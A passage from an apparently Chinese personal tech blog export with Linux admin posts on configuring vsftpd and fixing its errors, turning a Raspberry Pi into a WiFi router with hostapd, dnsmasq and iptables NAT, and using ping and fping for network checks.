<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">anonymous_enable=NO</span><br><span class="line">local_enable=YES</span><br><span class="line">write_enable=YES</span><br><span class="line">xferlog_enable=YES</span><br><span class="line">connect_from_port_20=YES</span><br><span class="line"></span><br><span class="line">listen=YES</span><br><span class="line"></span><br><span class="line">pam_service_name=vsftpd</span><br><span class="line">allow_writeable_chroot=YES</span><br><span class="line">local_root=/home/ftp_dir</span><br><span class="line">chroot_local_user=YES</span><br><span class="line">use_localtime=YES</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> user_list_deny=NO</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">do</span> not allow to login ftp</span></span><br><span class="line">userlist_enable=YES</span><br><span class="line">userlist_deny=NO</span><br><span class="line">userlist_file=/etc/vsftpd.user_list</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> user free timeout</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> idle_session_timeout=30</span></span><br><span class="line">data_connection_timeout=10</span><br><span class="line">accept_timeout=120</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">local</span> user transfer rate</span></span><br><span class="line">local_max_rate=50000</span><br><span class="line">max_clients=10</span><br><span class="line">max_per_ip=2</span><br><span class="line"></span><br><span class="line">pasv_enable=yes</span><br><span class="line">pasv_min_port=5000</span><br><span class="line">pasv_max_port=6000</span><br><span class="line"></span><br><span class="line">seccomp_sandbox=NO</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> welcome message</span></span><br><span class="line">ftpd_banner=&gt;&gt;&gt;&gt;&gt; Welcome to MineFTP &lt;&lt;&lt;&lt;&lt;</span><br><span class="line">dirmessage_enable=YES</span><br></pre></td></tr></table></figure>

<h2 id="VSFTP用户和文件目录设置"><a href="#VSFTP用户和文件目录设置" class="headerlink" title="VSFTP用户和文件目录设置"></a>VSFTP用户和文件目录设置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir /home/ftp_dir</span><br><span class="line">useradd -d /home/ftp_dir mineftp</span><br><span class="line">passwd mineftp</span><br><span class="line">usermod -aG mineftp whos</span><br><span class="line">usermod -s /sbin/nologin mineftp</span><br><span class="line">chown mineftp:mineftp /home/ftp_dir</span><br><span class="line"><span class="built_in">echo</span> mineftp &gt;&gt; /etc/vsftpd.user_list</span><br></pre></td></tr></table></figure>

<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="1-500-OOPS-vsftpd-refusing-to-run-with-writable-root-inside-chroot"><a href="#1-500-OOPS-vsftpd-refusing-to-run-with-writable-root-inside-chroot" class="headerlink" title="1. 500 OOPS: vsftpd: refusing to run with writable root inside chroot()"></a>1. 500 OOPS: vsftpd: refusing to run with writable root inside chroot()</h3><p>把 <strong>chroot_local_user</strong>  和 <strong>allow_writeable_chroot</strong> 改为 YES，或者用 wiki上的 <a href="https://wiki.archlinux.org/index.php/Very_Secure_FTP_Daemon_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#vsftpd:_refusing_to_run_with_writable_root_inside_chroot()" target="_blank" rel="noopener">方法</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chroot_local_user=YES</span><br><span class="line">allow_writeable_chroot=YES</span><br><span class="line">systemctl restart vsftpd</span><br></pre></td></tr></table></figure>

<h3 id="2-530-Login-incorrect"><a href="#2-530-Login-incorrect" class="headerlink" title="2.  530 Login incorrect"></a>2.  530 Login incorrect</h3><p>修改/etc/pam.d/vsftpd<br>将 <strong>auth required pam_shells.so</strong> 修改为 <strong>auth required pam_nologin.so</strong> 即可<br>重启vsftpd</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nano /etc/pam.d/vsftpd </span><br><span class="line"></span><br><span class="line"><span class="comment">#%PAM-1.0</span></span><br><span class="line">auth       required     /lib/security/pam_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeed</span><br><span class="line">auth       required     /lib/security/pam_unix.so shadow nullok</span><br><span class="line">auth       required     /lib/security/pam_nologin.so</span><br><span class="line">account    required     /lib/security/pam_unix.so</span><br><span class="line">session    required     /lib/security/pam_unix.so</span><br></pre></td></tr></table></figure>

<h3 id="3-vsftpd-service-Main-process-exited-code-exited"><a href="#3-vsftpd-service-Main-process-exited-code-exited" class="headerlink" title="3. vsftpd.service: Main process exited, code=exited"></a>3. vsftpd.service: Main process exited, code=exited</h3><p>一定要把 vsftpd.conf 文件所有者(owner) 改为 root，否则vsftpd无法启动</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chown root:root /etc/vsftpd.conf</span><br></pre></td></tr></table></figure>

<p>错误信息：</p>
<blockquote>
<p>vsftpd.service - vsftpd daemon<br>   Loaded: loaded (/usr/lib/systemd/system/vsftpd.service; disabled; vendor preset: disabled)<br>   Active: failed (Result: exit-code) since Sun 2019-07-28 18:57:07 CST; 40s ago<br>  Process: 6607 ExecStart=/usr/bin/vsftpd (code=exited, status=2)<br> Main PID: 6607 (code=exited, status=2)</p>
<p>7月 28 18:57:07 goo systemd[1]: Started vsftpd daemon.<br>7月 28 18:57:07 goo systemd[1]: vsftpd.service: Main process exited, code=exited, status=2/INVALIDARGUMENT<br>7月 28 18:57:07 goo systemd[1]: vsftpd.service: Failed with result ‘exit-code’.</p>
</blockquote>
<p>参考： </p>
<ul>
<li><a href="https://wiki.archlinux.org/index.php/Very_Secure_FTP_Daemon_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)" target="_blank" rel="noopener">Vsftpd Wiki</a></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>vsftpd</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派搭建简略WiFi无线路由器</title>
    <url>/raspberry-wifi-router/</url>
    <content><![CDATA[<p>目前我家有装有倆路由器，所以在搞一个觉得有点……<br>然而本文介绍用树莓派来搭建一个简略的WiFi无线路由器，来体验树莓派的强大功能。</p>
<a id="more"></a>

<p>PS： 更新时间: 2019-08-13 21:13</p>
<h3 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h3><p>用一根网线连接路由器和树莓派，用于提供网络<br>无线网卡，这里我用很久以前买的那个360随身WiFi(悲催)<br>主机：Archlinux，树莓派<br>工具：hostapd，dnsmasq，iptables</p>
<h3 id="树莓派配置信息"><a href="#树莓派配置信息" class="headerlink" title="树莓派配置信息"></a>树莓派配置信息</h3><p>插入网线网卡用网线连接好树莓派后开机，并在本机上ssh远程连接树莓派。<br>以下是树莓派的一些配置信息，其中wlan1就是外置无线接口。</p>
<p>// 我本来是想将无线接口wlan1的IP配置成静态地址，而wlan0接入因特网。但现在我用网线连接到树莓派所以干脆把树莓派作为第二个路由器。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pi@raspberrypi:~ $ uname -a</span><br><span class="line">Linux raspberrypi 4.9.80-v7+ <span class="comment">#1098 SMP Fri Mar 9 19:11:42 GMT 2018 armv7l GNU/Linux</span></span><br><span class="line">pi@raspberrypi:~ $ ifconfig </span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.2.110  netmask 255.255.255.0  broadcast 192.168.2.255</span><br><span class="line">        inet6 fe80::ba27:ebff:fe51:c2cd  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether b8:27:eb:51:c2:<span class="built_in">cd</span>  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 286  bytes 19770 (19.3 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 257  bytes 33091 (32.3 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1  (Local Loopback)</span><br><span class="line">        RX packets 6  bytes 522 (522.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 6  bytes 522 (522.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">wlan0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.3.1  netmask 255.255.255.0  broadcast 192.168.3.255</span><br><span class="line">        ether b8:27:eb:04:97:98  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">pi@raspberrypi:~ $ iwconfig </span><br><span class="line">wlan1     IEEE 802.11  ESSID:off/any  </span><br><span class="line">          Mode:Managed  Access Point: Not-Associated   Tx-Power=0 dBm   </span><br><span class="line">          Retry short <span class="built_in">limit</span>:7   RTS thr:off   Fragment thr:off</span><br><span class="line">          Power Management:on</span><br><span class="line">          </span><br><span class="line">lo        no wireless extensions.</span><br><span class="line"></span><br><span class="line">wlan0     IEEE 802.11  ESSID:off/any  </span><br><span class="line">          Mode:Managed  Access Point: Not-Associated   Tx-Power=31 dBm   </span><br><span class="line">          Retry short <span class="built_in">limit</span>:7   RTS thr:off   Fragment thr:off</span><br><span class="line">          Power Management:on</span><br><span class="line">          </span><br><span class="line">eth0      no wireless extensions.</span><br><span class="line"></span><br><span class="line">pi@raspberrypi:~ $ lsusb </span><br><span class="line">Bus 001 Device 005: ID 0c45:800a Microdia Vivitar Vivicam3350B</span><br><span class="line">Bus 001 Device 004: ID 148f:760b Ralink Technology, Corp. MT7601U Wireless Adapter</span><br><span class="line">Bus 001 Device 003: ID 0424:ec00 Standard Microsystems Corp. SMSC9512/9514 Fast Ethernet Adapter</span><br><span class="line">Bus 001 Device 002: ID 0424:9514 Standard Microsystems Corp. SMC9514 Hub</span><br><span class="line">Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub</span><br></pre></td></tr></table></figure>

<h3 id="配置无线网卡"><a href="#配置无线网卡" class="headerlink" title="配置无线网卡"></a>配置无线网卡</h3><p>这一步骤是修改树莓派的IP地址为路由器地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nano /etc/network/interfaces</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.2.110</span><br><span class="line">netmask	255.255.255.0</span><br><span class="line">gateway	192.168.2.1</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里的IP地址其实相当于 "路由器" ip地址</span></span><br><span class="line">allow-hotplug wlan0</span><br><span class="line">iface wlan0 inet static</span><br><span class="line">address 192.168.3.1</span><br><span class="line">netmask 255.255.255.0</span><br></pre></td></tr></table></figure>

<h3 id="配置hostapd"><a href="#配置hostapd" class="headerlink" title="配置hostapd"></a>配置hostapd</h3><p>hostapd能够“模拟”出一个AP，作为一个认证服务器，并对连接的设备控制管理。<br>简单说hostapd能够让我们设置WiFi的名称，密码和加密方式等等</p>
<blockquote>
<p>hostapd is a user space daemon for <strong>access point</strong> and <strong>authentication servers</strong>. It implements IEEE 802.11 access point management, IEEE 802.1X/WPA/WPA2/EAP Authenticators, RADIUS client, EAP server, and RADIUS authentication server. The current version supports Linux (Host AP, madwifi, mac80211-based drivers) and FreeBSD (net80211).</p>
</blockquote>
<p>安装 hostapd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install hostapd</span><br></pre></td></tr></table></figure>

<p>新建文件 <strong>/etc/hostapd/hostapd.conf</strong> ，并添加如下内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">无线网卡接口</span></span><br><span class="line">interface=wlan0</span><br><span class="line"><span class="meta">#</span><span class="bash">驱动程序</span></span><br><span class="line">driver=nl80211</span><br><span class="line">hw_mode=g</span><br><span class="line">ssid=WIFI-001</span><br><span class="line"><span class="meta">#</span><span class="bash">通道</span></span><br><span class="line">channel=6</span><br><span class="line"><span class="meta">#</span><span class="bash">加密模式 WPA2</span></span><br><span class="line">wpa=2</span><br><span class="line">wpa_passphrase=12345678</span><br><span class="line">wpa_key_mgmt=WPA-PSK</span><br><span class="line">wpa_pairwise=CCMP</span><br><span class="line">rsn_pairwise=CCMP</span><br><span class="line">auth_algs=3</span><br><span class="line">wmm_enabled=1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 连接ap的最大数量</span></span><br><span class="line">max_num_sta=10</span><br><span class="line">logger_stdout=-1</span><br><span class="line">logger_stdout_level=2</span><br></pre></td></tr></table></figure>

<p>其中 <strong>ssid</strong> 和 <strong>wpa_passphrase</strong> 分别为WiFi热点的名称和密码。</p>
<p>接着，还需修改 <strong>/etc/default/hostapd</strong> </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Defaults <span class="keyword">for</span> hostapd initscript</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> See /usr/share/doc/hostapd/README.Debian <span class="keyword">for</span> information about alternative</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> methods of managing hostapd.</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Uncomment and <span class="built_in">set</span> DAEMON_CONF to the absolute path of a hostapd configuration</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> file and hostapd will be started during system boot. An example configuration</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> file can be found at /usr/share/doc/hostapd/examples/hostapd.conf.gz</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line">DAEMON_CONF="/etc/hostapd/hostapd.conf"</span><br><span class="line"><span class="meta">#</span><span class="bash"> Additional daemon options to be appended to hostapd <span class="built_in">command</span>:-</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 	-d   show more debug messages (-dd <span class="keyword">for</span> even more)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 	-K   include key data <span class="keyword">in</span> debug messages</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 	-t   include timestamps <span class="keyword">in</span> some debug messages</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Note that -B (daemon mode) and -P (pidfile) options are automatically</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> configured by the init.d script and must not be added to DAEMON_OPTS.</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash">DAEMON_OPTS=<span class="string">""</span></span></span><br></pre></td></tr></table></figure>

<p>取消 <strong>DAEMON_CONF=”/etc/hostapd/hostapd.conf”</strong> 注释，并添加 hostapd.conf 的路径。这是hostapd守护进程默认要加载的配置文件，这样树莓派每次重启都会加载这个配置文件</p>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>当然，我们可以在此之前临时测试配置文件是否生效</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo hostapd /etc/hostapd/hostapd.conf</span></span><br><span class="line">Configuration file: /etc/hostapd/hostapd.conf</span><br><span class="line">Failed to create interface mon.wlan0: -95 (Operation not supported)</span><br><span class="line">wlan0: Could not connect to kernel driver</span><br><span class="line">Using interface wlan0 with hwaddr b8:27:eb:04:97:98 and ssid "Wifi"</span><br><span class="line">wlan0: interface state UNINITIALIZED-&gt;ENABLED</span><br><span class="line">wlan0: AP-ENABLED</span><br></pre></td></tr></table></figure>

<p>看到 </p>
<blockquote>
<p>wlan0: interface state UNINITIALIZED-&gt;ENABLED<br>wlan0: AP-ENABLED</p>
</blockquote>
<p>就表示成功创建了一个AP，但无法连接到网络。</p>
<h3 id="配置-dnsmasq"><a href="#配置-dnsmasq" class="headerlink" title="配置 dnsmasq"></a>配置 dnsmasq</h3><blockquote>
<p><a href="http://www.thekelleys.org.uk/dnsmasq/doc.html" target="_blank" rel="noopener">Dnsmasq</a> 提供 DNS 缓存和 DHCP 服务功能。作为域名解析服务器(DNS)，dnsmasq可以通过缓存 DNS 请求来提高对访问过的网址的连接速度。作为DHCP 服务器，<a href="https://www.archlinux.org/packages/?name=dnsmasq" target="_blank" rel="noopener">dnsmasq</a> 可以用于为局域网电脑分配内网ip地址和提供路由。DNS和DHCP两个功能可以同时或分别单独实现。dnsmasq轻量且易配置，适用于个人用户或少于50台主机的网络。</p>
</blockquote>
<p>也就是说，利用dnsmasq的DNS缓存功能能够让连接AP的设备请求缓存下来，这样下次再连接就无法再需要输入密码，当然这只是暂时的。而通过DHCP就可以动态的为已经连接的设备分配网ip地址等信息。</p>
<p>安装 dnsmasq</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install dnsmasq</span><br></pre></td></tr></table></figure>

<p>编辑 <strong>/etc/dnsmasq.conf</strong>，其中大部分都是注释。<br>在最后添加如下内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">interface=wlan0</span><br><span class="line">listen-address=127.0.0.1,192.168.3.1</span><br><span class="line">dhcp-range=192.168.3.50,192.168.3.150,12h</span><br><span class="line"><span class="meta">#</span><span class="bash"> DNS</span></span><br><span class="line">resolv-file=/etc/resolv.conf</span><br></pre></td></tr></table></figure>

<p><strong>dhcp-range</strong> 表示要动态分配给连接设备IP地址在所属IP网段范围之内，这里为50~150</p>
<p><strong>/etc/resolv.conf</strong> 配置如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nameserver 8.8.8.8</span><br></pre></td></tr></table></figure>

<h3 id="开启IP转发功能"><a href="#开启IP转发功能" class="headerlink" title="开启IP转发功能"></a>开启IP转发功能</h3><p>注意，这一步是必须的，不然就算设备连接成功WiFi，那也无法连接到网络！！！</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo sh -c "echo 1 &gt; /proc/sys/net/ipv4/ip_forward"</span><br><span class="line">2. sudo sysctl net.ipv4.ip_forward=1 </span><br><span class="line">sudo sysctl -p /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>

<p>建议修改 <strong>/etc/sysctl.conf</strong> 文件，只需将 <code>#net.ipv4.ip_forward=1</code> 取消注释即可。</p>
<h3 id="iptables防火墙路由转发"><a href="#iptables防火墙路由转发" class="headerlink" title="iptables防火墙路由转发"></a>iptables防火墙路由转发</h3><p>这一步同上一步一样重要，这里主要是设置nat路由转发，不然还是无法上网的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pi@raspberrypi:~ $ sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">pi@raspberrypi:~ $ sudo iptables -t nat --line-numbers -L -n</span><br><span class="line">Chain PREROUTING (policy ACCEPT)</span><br><span class="line">num  target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">Chain INPUT (policy ACCEPT)</span><br><span class="line">num  target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">Chain OUTPUT (policy ACCEPT)</span><br><span class="line">num  target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">Chain POSTROUTING (policy ACCEPT)</span><br><span class="line">num  target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">1    MASQUERADE  all  --  0.0.0.0/0            0.0.0.0/0</span><br></pre></td></tr></table></figure>

<p>这里的意思是，路由器源地址（<strong>MASQUERADE</strong>自动获取当前树莓派IP地址[ 比如我这里为静态192.168.2.110 ])，并且已接入网络）将数据通过eth0接口转发到已连接的IP地址（0.0.0.0/0）</p>
<p>在这里 -j MASQUERADE 相当于 -j SNAT –to-source 192.168.2.110<br>这个时候设备既可以连接到互联网了！</p>
<h3 id="开启启动服务"><a href="#开启启动服务" class="headerlink" title="开启启动服务"></a>开启启动服务</h3><p>1.开机自启动服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> hostapd</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> dnsmasq</span><br></pre></td></tr></table></figure>

<p>2.自动设置iptables</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo iptables-save &gt; /home/pi/iptables_forward</span><br></pre></td></tr></table></figure>

<p>添加如下内容到 <strong>/etc/rc.local</strong> (exit 0 之前)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables-restore &lt; /home/pi/iptables_forward</span><br></pre></td></tr></table></figure>

<p>注意还要开启了IP转发功能</p>
<p>之后 <code>sudo reboot</code> 重启，等待</p>
<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>如果在 <code>sudo systemctl enable hostapd</code> 时出现一下信息</p>
<blockquote>
<p>Synchronizing state of hostapd.service with SysV service script with /lib/systemd/systemd-sysv-install.<br>Executing: /lib/systemd/systemd-sysv-install enable hostapd<br>Failed to enable unit: Unit file /etc/systemd/system/hostapd.service is masked.</p>
</blockquote>
<p>解决方法 <code>sudo systemctl unmask hostapd</code> 后再 <code>sudo systemctl enable hostapd</code></p>
<p>最后的最后补成果图<br><img src="/uploads/images/rasppi/file_004.png" alt="img"></p>
<p><img src="/uploads/images/rasppi/phone.jpg" alt="img"></p>
<p><img src="/uploads/images/rasppi/file_005.png" alt="img"></p>
<p>bye~</p>
]]></content>
      <categories>
        <category>RaspberryPi</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Ping工具汇总</title>
    <url>/linux-ping-tools/</url>
    <content><![CDATA[<p>大家都应该熟悉ping这个网络诊断工具，它用来检测网络是否连通以及目的主机是否在线。然而唯一缺点是它只支持ICMP协议。因此，大多数主机都会防火墙过滤ICMP数据包，不过，Linux下也有跟他类似的ping工具，本文将会介绍一些常见的工具。</p>
<p><img src="/uploads/images/imgs/command-87198_640.jpg" alt></p>
<a id="more"></a>

<h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>一般作为所有系统默认自带的 <code>ping</code> ，它同样也很重要。通过 <code>man ping</code> 来查看ping的帮助手册</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping  [-aAbBdDfhLnOqrRUvV46] [-c count] [-F flowlabel] [-i interval] [-I interface]</span><br><span class="line">       [-l preload] [-m mark] [-M pmtudisc_option] [-N nodeinfo_option] [-w deadline]  [-W</span><br><span class="line">       timeout]  [-p  pattern] [-Q tos] [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp</span><br><span class="line">       option] [hop ...] destination</span><br></pre></td></tr></table></figure>

<p>常用的也就是 -c(发送数据包的数量)，-s(发送数据的字节大小)，-I(网络接口)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ping baidu.com -c 2 -s 64</span><br><span class="line">PING baidu.com (111.13.101.208) 64(92) bytes of data.</span><br><span class="line">72 bytes from 111.13.101.208 (111.13.101.208): icmp_seq=1 ttl=55 time=44.2 ms</span><br><span class="line">72 bytes from 111.13.101.208 (111.13.101.208): icmp_seq=2 ttl=55 time=43.4 ms</span><br><span class="line">--- baidu.com ping statistics ---</span><br><span class="line">2 packets transmitted, 2 received, 0% packet loss, time 1017ms</span><br><span class="line">rtt min/avg/max/mdev = 43.490/43.873/44.257/0.436 ms</span><br></pre></td></tr></table></figure>

<p>假如我要ping一个主机的IPv6地址，那么可以这样做(必须指定 -I eth0)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ping -I eth0 fe80::2605:fff:fe41:e387 -c 2</span><br><span class="line">PING fe80::2605:fff:fe41:e387(fe80::2605:fff:fe41:e387) from fe80::2cca:ff77:78dc:1025%eth0 eth0: 56 data bytes</span><br><span class="line">64 bytes from fe80::2605:fff:fe41:e387%eth0: icmp_seq=1 ttl=255 time=1.67 ms</span><br><span class="line">64 bytes from fe80::2605:fff:fe41:e387%eth0: icmp_seq=2 ttl=255 time=4.43 ms</span><br><span class="line">--- fe80::2605:fff:fe41:e387 ping statistics ---</span><br><span class="line">2 packets transmitted, 2 received, 0% packet loss, time 1001ms</span><br><span class="line">rtt min/avg/max/mdev = 1.671/3.054/4.438/1.384 ms</span><br></pre></td></tr></table></figure>

<p>或者 <strong>ping6 -I eth0 fe80::2605:fff:fe41:e387 -c 2</strong></p>
<h3 id="fping"><a href="#fping" class="headerlink" title="fping"></a>fping</h3><p>相对来说fping比ping要高级点(<strong>也是通过ICMP协议来发送数据包的</strong>)，他可以向多个目标主机发送ping，也可以指定一个主机列表文件。其中，fping的 <strong>-g</strong> 选项比较重要</p>
<blockquote>
<p><strong>-g, –generate</strong> generate target list (only if no -f specified)<br>(give start and end IP in the target list, or a <strong>CIDR address</strong>)<br>(ex. fping -g 192.168.1.0 192.168.1.255 or fping -g 192.168.1.0/24)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fping --help</span><br><span class="line">Usage: fping [options] [targets...]</span><br><span class="line">Probing options:</span><br><span class="line">   -4, --ipv4         only ping IPv4 addresses</span><br><span class="line">   -6, --ipv6         only ping IPv6 addresses</span><br><span class="line">   -b, --size=BYTES   amount of ping data to send, in bytes (default: 56)</span><br><span class="line">   -B, --backoff=N    set exponential backoff factor to N (default: 1.5)</span><br><span class="line">   -c, --count=N      count mode: send N pings to each target</span><br><span class="line">   -f, --file=FILE    read list of targets from a file ( - means stdin)</span><br><span class="line">   -g, --generate     generate target list (only if no -f specified)</span><br><span class="line">                      (give start and end IP in the target list, or a CIDR address)</span><br><span class="line">                      (ex. fping -g 192.168.1.0 192.168.1.255 or fping -g 192.168.1.0/24)</span><br><span class="line">   -H, --ttl=N        set the IP TTL value (Time To Live hops)</span><br><span class="line">   -I, --iface=IFACE  bind to a particular interface</span><br><span class="line">   -l, --loop         loop mode: send pings forever</span><br><span class="line">   -m, --all          use all IPs of provided hostnames (e.g. IPv4 and IPv6), use with -A</span><br><span class="line">   -M, --dontfrag     set the Don&apos;t Fragment flag</span><br><span class="line">   -O, --tos=N        set the type of service (tos) flag on the ICMP packets</span><br><span class="line">   -p, --period=MSEC  interval between ping packets to one target (in ms)</span><br><span class="line">                      (in loop and count modes, default: 1000 ms)</span><br><span class="line">   -r, --retry=N      number of retries (default: 3)</span><br><span class="line">   -R, --random       random packet data (to foil link data compression)</span><br><span class="line">   -S, --src=IP       set source address</span><br><span class="line">   -t, --timeout=MSEC individual target initial timeout (default: 500 ms,</span><br><span class="line">                      except with -l/-c/-C, where it&apos;s the -p period up to 2000 ms)</span><br><span class="line">Output options:</span><br><span class="line">   -a, --alive        show targets that are alive</span><br><span class="line">   -A, --addr         show targets by address</span><br><span class="line">   -C, --vcount=N     same as -c, report results in verbose format</span><br><span class="line">   -D, --timestamp    print timestamp before each output line</span><br><span class="line">   -e, --elapsed      show elapsed time on return packets</span><br><span class="line">   -i, --interval=MSEC  interval between sending ping packets (default: 10 ms)</span><br><span class="line">   -n, --name         show targets by name (-d is equivalent)</span><br><span class="line">   -N, --netdata      output compatible for netdata (-l -Q are required)</span><br><span class="line">   -o, --outage       show the accumulated outage time (lost packets * packet interval)</span><br><span class="line">   -q, --quiet        quiet (don&apos;t show per-target/per-ping results)</span><br><span class="line">   -Q, --squiet=SECS  same as -q, but show summary every n seconds</span><br><span class="line">   -s, --stats        print final stats</span><br><span class="line">   -u, --unreach      show targets that are unreachable</span><br><span class="line">   -v, --version      show version</span><br></pre></td></tr></table></figure>

<p>用法如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; fping -I eth0 -b 64 -f list_targets -a -q -s</span><br><span class="line">192.168.1.16  : xmt/rcv/%loss = 2/2/0%, min/avg/max = 58.0/74.1/90.1</span><br><span class="line">192.168.1.15  : xmt/rcv/%loss = 2/0/100%</span><br><span class="line">192.168.1.110 : xmt/rcv/%loss = 2/2/0%, min/avg/max = 1.48/3.39/5.31</span><br><span class="line">       3 targets</span><br><span class="line">       2 alive</span><br><span class="line">       1 unreachable</span><br><span class="line">       0 unknown addresses</span><br><span class="line">       1 timeouts (waiting for response)</span><br><span class="line">       6 ICMP Echos sent</span><br><span class="line">       4 ICMP Echo Replies received</span><br><span class="line">       0 other ICMP received</span><br><span class="line"> 1.48 ms (min round trip time)</span><br><span class="line"> 38.7 ms (avg round trip time)</span><br><span class="line"> 90.1 ms (max round trip time)</span><br><span class="line">        2.022 sec (elapsed real time)</span><br></pre></td></tr></table></figure>

<p>-b 指定发送数据字节大小<br>-f 指定一个目标主机列表文件，每行一个地址<br>-a 只显示可以ping通的目标主机<br>-q 安静模式，不显示在ping时的每个主机的结果<br>-s 最后显示总计结果<br>-r 重试次数，默认:3<br>还可以指定 -g 来扫描局域网下所有主机</p>
